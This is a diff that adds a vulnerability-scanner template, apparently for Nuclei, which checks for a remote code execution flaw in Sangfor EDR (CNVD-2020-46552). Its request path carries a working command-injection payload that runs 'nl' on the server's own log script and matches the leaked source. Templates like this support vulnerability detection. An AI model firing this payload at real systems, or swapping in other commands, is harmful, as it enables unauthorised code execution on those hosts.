@@ -1,0 +1,22 @@
+id: sangfor-edr-rce-cnvd-2020-46552
+info:
+  name: Sangfor EDR Remote Code Execution Vulnerability (CNVD-2020-46552)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,CNVD-2020-46552
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/tool/log/c.php?strip_slashes=printf&host=nl+c.php"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "$show_input = function($info)"
+          - "$strip_slashes($host)"
+          - "Log Helper"
+      - type: status
+        status:
+          - 200
